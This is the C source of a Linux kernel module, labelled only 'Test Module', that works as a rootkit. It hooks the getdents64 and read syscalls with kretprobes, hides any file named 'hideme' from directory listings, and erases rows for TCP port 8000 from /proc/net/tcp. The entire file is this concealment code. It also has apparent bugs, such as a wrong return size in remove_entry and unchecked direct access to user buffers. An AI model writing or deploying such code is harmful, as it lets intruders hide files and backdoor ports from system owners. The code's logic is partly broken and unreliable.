#define pr_fmt(fmt) KBUILD_MODNAME ": " fmt

#include <linux/module.h>
#include <linux/kernel.h>
#include <asm/unistd.h>
#include <linux/kthread.h>
#include <linux/kprobes.h>
#include <linux/fprobe.h>
#include <linux/dirent.h>
#include <linux/string.h>
#include <linux/fdtable.h>
#include <linux/sched.h>
#include <linux/mm_types.h>
#include <linux/sched/signal.h>

/// const file name to hide
const char* hide_file_name = "hideme";
const int port_to_hide = 8000;


typedef bool (*entry_filter_t)(struct linux_dirent64*, void* data);

/// hide directory entries from result buffer
/// @buffer is the result buffer to store @refitem linux_dirent64
/// @size of buffer in bytes
/// @return new buffer size
static unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data);


static unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size);

static int ends_with(const char *str, const char *suffix);

struct getdent64_arguments {
    unsigned int fd;
    void* buffer_ptr;
    unsigned int count;
};

static bool hide_entry_by_name(struct linux_dirent64* entry, void* data){
    const char* str = data;
    if(strcmp(entry->d_name, str) == 0){
        return true;
    }
    return false;
}


static int getents64_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct getdent64_arguments*)ri->data;

    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int getents64_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct getdent64_arguments* args = (struct getdent64_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // hide by name
    unsigned long new_size = hide_entry(args->buffer_ptr, buffer_count, hide_entry_by_name, (void*)hide_file_name);
    regs_set_return_value(regs, new_size);

    //pr_info("getdents64 (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    return 0;
}

struct read_arguments {
    unsigned int fd;
    void* buffer_ptr;
    unsigned int count;
};

static int read_handle_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args;
    // syscall wrappers __x64_sys_* gets only ptr to regs
    regs = ((struct pt_regs*)regs->di);

    if (!current->mm)
        return 1;	/* Skip kernel threads */


    args = (struct read_arguments*)ri->data;

//    //unsigned long syscall = regs->orig_ax;
    args->fd = regs->di; // 0
    args->buffer_ptr = (void*)regs->si; // 1
    args->count = regs->dx; // 2

    return 0;
}

static int read_handle_return(struct kretprobe_instance *ri, struct pt_regs *regs)
{
    struct read_arguments* args = (struct read_arguments*) ri->data;
    unsigned long buffer_count = regs_return_value(regs);

    // filter socket
    char fd_path[256];

    struct file* file = files_lookup_fd_raw(current->files, args->fd);
    struct dentry* dentry = file->f_path.dentry;
    char* path = dentry_path_raw(dentry, fd_path, 256);

    struct super_block* sb= file->f_path.mnt->mnt_sb;

    // pr_info("read (fd=%d, buffer=%ld, count=%d) = %ld\n", args->fd, (unsigned long) args->buffer_ptr, args->count, buffer_count);
    // pr_info("path=%s, sb=%s, name=%s, open_fds=%ld\n", path, sb->s_id, process_to_hide->comm, open_fds);

    // do not intercept read syscall with 0 return value 
    // this means end of file reached
    if(buffer_count == 0)
        return 0;


    // intercepting only /proc/net/tcp or /proc/pid/net/tcp
    if(strcmp(sb->s_id, "proc") == 0 && ends_with(path, "/net/tcp")){
        int index = -1;
        unsigned long address = -1;
        unsigned short port = -1;

        char* row_start = args->buffer_ptr;
        int new_length = 0;
        for(int row = 0; *row_start != '\0' ; row++){
            int row_length = 0;

            // go to end of line
            while(*(row_start + row_length) != '\n') ++row_length;
            // skip \n
            ++row_length;

            if(row == 0){
                // "Skip" first row
                new_length += row_length;
            } else {
                int result = sscanf(row_start, "%d: %lX:%hX", &index, &address, &port);
                
                if(result == 3){
                    // writes line sequentially except line to hide, 
                    // so when line needs to be hidden it will be overriden or ignore with the new length
                    if(port != port_to_hide){
                        strncpy(args->buffer_ptr + new_length, row_start, row_length);
                        new_length += row_length;
                    }  
                } else{
                    pr_warn("Cant Parse line \n");
                    new_length += row_length;
                }
            }

            row_start += row_length;
        }
        
        // read returns the number of bytes it read
        regs_set_return_value(regs, new_length);                    
    }
    return 0;
}


static struct kretprobe getdents64_kret_probe = {
        .maxactive = 20,
        .entry_handler = getents64_handle_entry,
        .handler = getents64_handle_return,
        .kp.symbol_name = "__x64_sys_getdents64",
        .data_size = sizeof(struct getdent64_arguments),
};

static struct kretprobe read_kret_probe = {
        .maxactive = 20,
        .entry_handler = read_handle_entry,
        .handler = read_handle_return,
        .kp.symbol_name = "__x64_sys_read",
        .data_size = sizeof(struct read_arguments),
};


static int __init entrypoint(void)
{
    if (register_kretprobe(&getdents64_kret_probe) < 0 || register_kretprobe(&read_kret_probe) < 0) {
        pr_info("register_kretprobe  failed\n");
        return -1;
    }
    pr_info("kretprobe registered\n");
    return 0;
}

static void __exit cleanup(void){
    pr_info("getdents64_kret_probe Missed probing %d instances of %s\n",
            getdents64_kret_probe.nmissed, getdents64_kret_probe.kp.symbol_name);

    pr_info("read_kret_probe Missed probing %d instances of %s\n",
            read_kret_probe.nmissed, read_kret_probe.kp.symbol_name);

    unregister_kretprobe(&getdents64_kret_probe);
    unregister_kretprobe(&read_kret_probe);
    pr_info("Yarin Module cleanup\n");
}

module_init(entrypoint)
module_exit(cleanup)
MODULE_LICENSE("GPL");
MODULE_AUTHOR("Yarin");
MODULE_DESCRIPTION("Test Module");

unsigned long hide_entry(void* buffer, unsigned long size, entry_filter_t entryFilter, void* data){
    unsigned long offset = 0;

    // find entry to hide
    while(offset < size){
        struct linux_dirent64* current_ent = (struct linux_dirent64* )(buffer + offset);
        if(entryFilter(current_ent, data) == true){
            return remove_entry(buffer, size, offset, current_ent->d_reclen);
        }
        offset += current_ent->d_reclen;
    }

    return size;
}

unsigned long remove_entry(void* buffer, unsigned int buffer_size, int entry_offset, int entry_size) {
    // ptr of entry
    void* dest = buffer + entry_offset;
    // ptr of next entry
    void* src = dest + entry_size;
    // count of entries from entry to hide to end
    unsigned long count = buffer_size - entry_offset - entry_size;

    if(count == 0){
        // nothing to copy it is last entry
        return buffer_size - entry_size;
    }
    else {
        // offset     2
        // nextOffset 3
        // [0, 1, 2, 3, 4]
        // -----[        ] dest
        // --------[     ] source
        memcpy(dest, src, count);
        return count;
    }
}

int ends_with(const char *str, const char *suffix) {
    size_t str_len = strlen(str);
    size_t suffix_len = strlen(suffix);
  
    return (str_len >= suffix_len) &&
           (strncmp(str + str_len - suffix_len, suffix, suffix_len) == 0);
  }